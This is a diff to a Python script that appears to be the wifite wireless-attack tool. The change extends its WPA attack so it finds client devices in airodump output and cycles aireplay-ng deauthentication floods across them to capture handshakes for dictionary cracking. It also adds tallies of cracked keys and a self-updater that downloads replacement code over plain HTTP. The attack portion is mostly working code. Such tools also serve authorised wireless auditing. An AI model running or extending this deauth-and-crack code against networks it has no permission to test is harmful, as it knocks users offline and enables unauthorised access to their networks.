@@ -6,10 +6,11 @@
 """
 
 """ TODO LIST:
-    -test endless (WPA_MAXWAIT=0 or WEP_MAXWAIT=0)
+    BUG: WEP doesn't keep cracking if ctrl+c is used to continue...
+    .
+    -test endless on wep WEP_MAXWAIT=0
     -test SKA (my router won't allow it, broken SKA everytime)
-    -in WPA: scan for new clients, add to 'deauth' list, cycle through list
-	-when using -i, automatically select interface if in mon. mode, or to put in mon. mode
+    -when using -i, automatically select interface if in mon. mode, or to put in mon. mode
 """
 
 """ ISSUES:
@@ -23,7 +24,7 @@ import re                     # reg-ex: for replacing
 import urllib                 # needed for updating the script
 
 # current revision
-REVISION=8
+REVISION=9
 
 # default wireless interface (blank to prompt)
 IFACE=''
@@ -81,8 +82,13 @@ P  = "\033[35m"; # purple
 C  = "\033[36m"; # cyan
 GR = "\033[37m"; # gray
 
-############################################################################### update
+############################################################################### upgrade methods
 def get_revision():
+	""" checks the googlecode page
+		returns a tuple with info on the latest revision: 
+			revision_number, description, last_modified
+		returns -1, '' ,'' if page could not be loaded properly
+	"""
 	irev  =-1
 	desc =''
 	since=''
@@ -120,6 +126,12 @@ def get_revision():
 	return (irev, desc, since)
 
 def update():
+	""" the 'ui' portion of upgrading.
+		uses get_revision(), compares that revision to this script's revision number,
+		tells user they're already updated if revisions are equal.
+		prompts to upgrade if we're out of date,
+			if user types 'y', runs upgrade()
+	"""
 	global REVISION
 	
 	try:
@@ -152,6 +164,12 @@ def update():
 		print R+'[+] ^C interrupted; aborting updater'
 	
 def upgrade():
+	""" downloads latest version of wifite.py, saves as wifite_new.py
+		creates shell script that deletes the old wifite.py and puts the new wifite_new.py in it's place
+		changes permissions on the new wifite.py so it is executable
+		also, it lets the user know what is happening
+		exits after it is ran
+	"""
 	print GR+'[+] '+G+'downloading'+W+' update...'
 	sock = urllib.urlopen('http://wifite.googlecode.com/svn/trunk/wifite.py')
 	page = sock.read()
@@ -181,7 +199,7 @@ def upgrade():
 ############################################################################### main
 def main():
 	""" where the magic happens """
-	global IFACE, ATTACK, DICT, THIS_MAC, SKIP_TO_WPA, ATTEMPTS
+	global IFACE, ATTACK, DICT, THIS_MAC, SKIP_TO_WPA, ATTEMPTS, CRACKED, HANDSHAKES
 	
 	try:
 		# print banner
@@ -226,28 +244,62 @@ def main():
 			# if user breaks during an attack and wants to skip to cracking...
 			if SKIP_TO_WPA:
 				break
-		
+			
 		
 		if len(WPA_CRACK) > 0 and DICT != '':
 			# we have wpa handshakes to crack!
 			# format is ['filename', 'ssid']
 			for i in xrange(0, len(WPA_CRACK)):
 				wpa_crack(i)
-				pass
 		
+		# check if we tried to crack a WPA...
+		had_wpa=False
+		for x in ATTACK:
+			if TARGETS[x-1][2].startswith('WPA'):
+				had_wpa=True
+				break
+		
+		# these if statements are for colors and plural fixing.
+		# could've just done a one-liner, but this looks prettier
 		if len(ATTACK) == 1:
 			print GR+'[+] '+W+'attack is '+W+'complete'+W+';',
 		else:
 			print GR+'[+] '+W+'attacks are '+W+'complete'+W+';',
+			if ATTEMPTS==1:
+				print O+'1 attempt,',
+			else:
+				print O+str(ATTEMPTS) + ' attempts,',
+			
+		if had_wpa:
+			# only print handshakes if we cracked or targetted a WPA network
+			if HANDSHAKES==0:
+				print R+str(HANDSHAKES)+' handshakes'+W+',',
+			elif HANDSHAKES==1:
+				print G+'1 handshake'+W+',',
+			else:
+				print G+str(HANDSHAKES)+' handshakes'+W+',',
+			
+			if DICT != '':
+				# only display amount cracked if user specified a dictionary
+				if CRACKED == 0:
+					print R+str(CRACKED)+' cracked'
+				else:
+					print G+str(CRACKED)+' cracked'
+		else:
+			# only targeted WEP network(s), only display attempted/cracked (not handshakes)
+			if CRACKED == 0:
+				print R+str(CRACKED)+' cracked'
+			else:
+				print G+str(CRACKED)+' cracked'
 		
-		
+		# display the log
 		if len(THE_LOG) > 0:
-			print G+'session summary:'+W
+			print GR+'[+] '+G+'session summary:'+W
 			for i in THE_LOG:
 				print GR+'    -'+i
-			
-		else:
-			print W+'the program will exit now'+W
+		
+		#else:
+		#	print W+'the program will exit now'+W
 		
 	except KeyboardInterrupt:
 		print GR+'\n[!] '+O+'^C interrupt received, '+R+'exiting'+W
@@ -816,21 +868,21 @@ def dict_check():
 				# we don't have a dictionary and the user wants to crack WPA
 				print GR+'\n[+] '+W+'in order to crack WPA, you will need to '+O+'enter a dictionary file'
 				ent = 'blahnotafile'
-				try:
-					while 1:
-						print GR+'[+] '+W+'enter the path to the dictionary to use, or "'+G+'none'+W+'" to not crack at all:'
-						ent = raw_input()
-						if ent == 'none' or ent == '"none"':
-							break
-						elif not os.path.exists(ent):
-							print R+'[!] error! path not found: '+O+ent+R+'; please try again\n'
-						else:
-							DICT=ent
-							print GR+'[+] '+W+'using "'+G+DICT+W+'" as wpa wordlist dictionary'
-							break
+				#try:
+				while 1:
+					print GR+'[+] '+W+'enter the path to the dictionary to use, or "'+G+'none'+W+'" to not crack at all:'
+					ent = raw_input()
+					if ent == 'none' or ent == '"none"':
+						break
+					elif not os.path.exists(ent):
+						print R+'[!] error! path not found: '+O+ent+R+'; please try again\n'
+					else:
+						DICT=ent
+						print GR+'[+] '+W+'using "'+G+DICT+W+'" as wpa wordlist dictionary'
+						break
 					
-				except KeyboardInterrupt:
-					print GR+'\n[+] '+W+'no dictionary file entered; continuing anyway'
+				#except KeyboardInterrupt:
+				#	print GR+'\n[+] '+W+'no dictionary file entered; continuing anyway'
 					
 				break
 
@@ -1522,11 +1574,20 @@ def attack_fakeauth(index):
 def attack_wpa(index):
 	""" index is the index of the TARGETS list that we are attacking
 	    opens airodump to capture whatever happens with the bssid
-		sends deauth requests to the router (or a client, if found)
+		sends deauth requests to the router (or any clients, if found)
+		 -adds clients as the attack progresses,
+		 -cycles between attacking each client indivdiually, and every client (broadcast)
 		waits until a handshake it captured, the user hits ctrl+c, OR the timer goes past WPA_MAXWAIT
 	"""
 	global TARGETS, CLIENTS, IFACE, WPA_CRACK, SKIP_TO_WPA, HANDSHAKES
 	TIME_START=time.time()
+	
+	cli=CLIENTS.get(TARGETS[index][0],None)
+	if cli == None:
+		wpa_clients=[]
+	else:
+		wpa_clients=[cli]
+	wpa_client_index=0
 	
 	# logit('started WPA handshake capture for "' + TARGETS[index][8] + '"')
 	try:
@@ -1537,18 +1598,27 @@ def attack_wpa(index):
 		proc_read = subprocess.Popen(cmd, stdout=open(os.devnull, 'w'), stderr=open(os.devnull, 'w'))
 		
 		print GR+'['+sec2hms(WPA_MAXWAIT)+'] '+W+'starting wpa handshake capture'
-		cmd = ['aireplay-ng','-0','3','-a',TARGETS[index][0]]
-		if CLIENTS.get(TARGETS[index][0], None) != None:
-			cmd.append('-h')
-			cmd.append(CLIENTS.get(TARGETS[index][0]))
-		cmd.append(IFACE)
 		got_handshake=False
 		
 		while time.time() - TIME_START < WPA_MAXWAIT or WPA_MAXWAIT == 0:
+			# generate command-line for deauth attack
+			cmd = ['aireplay-ng','-0','3','-a',TARGETS[index][0]]
+			if len(wpa_clients) > 0:
+				# we have clients to attack!
+				if wpa_client_index < len(wpa_clients):
+					# index is within range, points at a real client
+					cmd.append('-h')
+					cmd.append(wpa_clients[wpa_client_index])
+				
+				wpa_client_index+=1 #increment index
+				if wpa_client_index > len(wpa_clients):
+					wpa_client_index=0 # set back to zero if we go too far
+			cmd.append(IFACE)
+			
 			proc_deauth = subprocess.Popen(cmd, stdout=open(os.devnull, 'w'), stderr=open(os.devnull, 'w'))
 			proc_deauth.wait()
 			
-			print '\r'+GR+'['+get_time(WPA_MAXWAIT,TIME_START)+'] '+W+'sending 3 deauth packets;                  ',
+			print '\r'+GR+'['+get_time(WPA_MAXWAIT,TIME_START)+'] '+W+'sent 3 deauth packets;                  ',
 			sys.stdout.flush()
 			
 			# check for handshake using aircrack
@@ -1578,9 +1648,9 @@ def attack_wpa(index):
 				subprocess.call(['cp','wpa-01.cap',temp + '.cap'])
 				
 				print '\r'+GR+'['+get_time(WPA_MAXWAIT,TIME_START)+ \
-						'] '+W+'sending 3 deauth packets; '+G+'handshake captured!'+W+' saved as "'+G+temp+'.cap'+W+'"'
+						'] '+W+'sent 3 deauth packets; '+G+'handshake captured!'+W+' saved as "'+G+temp+'.cap'+W+'"'
 				sys.stdout.flush()
-				logit('got handshake for "'+TARGETS[index][8]+'" stored handshake in "' + temp + '.cap"')
+				#logit('got handshake for "'+TARGETS[index][8]+'" stored handshake in "' + temp + '.cap"')
 				HANDSHAKES += 1
 				
 				# add the filename and SSID to the list of 'to-crack' after everything's done
@@ -1589,11 +1659,38 @@ def attack_wpa(index):
 			
 			else:
 				# no handshake yet
-				print '\r'+GR+'['+get_time(WPA_MAXWAIT,TIME_START)+'] '+W+'sending 3 deauth packets; '+O+'no handshake yet ',
+				print '\r'+GR+'['+get_time(WPA_MAXWAIT,TIME_START)+'] '+W+'sent 3 deauth packets; '+O+'no handshake yet ',
 				sys.stdout.flush()
 			
 			time.sleep(WPA_TIMEOUT)
-		
+			
+			# check wpa-01.csv for new clients
+			try:
+				f=open('wpa-01.csv','r')
+				csv=f.read().split('\n')
+				f.close()
+			except Exception:
+				pass
+			
+			thereyet=False
+			for i in xrange(0, len(csv)):
+				if csv[i].find('Station MAC,') != -1:
+					thereyet=True
+					
+				elif thereyet==True:
+					cli=csv[i].split(',')
+					if len(cli) > 5:
+						if cli[5].strip() == TARGETS[index][0]:
+							# we have a client
+							cli[0]=cli[0].strip()
+							try:
+								wpa_clients.index(cli[0])
+							except ValueError:
+								# client not in list! add it
+								wpa_clients.append(cli[0])
+								print '\r'+GR+'['+get_time(WPA_MAXWAIT,TIME_START)+\
+								              '] '+G+'added new client: '+W+cli[0]+', '+G+'total: '+str(len(wpa_clients))+' '
+			
 		if got_handshake==False:
 			print R+'\n['+sec2hms(0)+'] unable to capture handshake in time (' + str(WPA_MAXWAIT) + ' sec)'
 	
@@ -1652,8 +1749,12 @@ def attack_wpa(index):
 				SKIP_TO_WPA=True
 				return
 			else:
-				print GR+'[+] '+R+'exiting'
-				sys.exit(0)
+				#print GR+'[+] '+R+'exiting'
+				#sys.exit(0)
+				
+				WPA_CRACK=[] # clear the wpa crack list
+				SKIP_TO_WPA=True # skip to wpa cracking (will skip past wpa cracking)
+				return
 		else:
 			# no reason to keep running! gtfo
 			return
@@ -2022,7 +2123,6 @@ def sec2hms(sec):
 	return result
 
 main()
-#update()
 
 # helpful diagram!
 # TARGETS list format
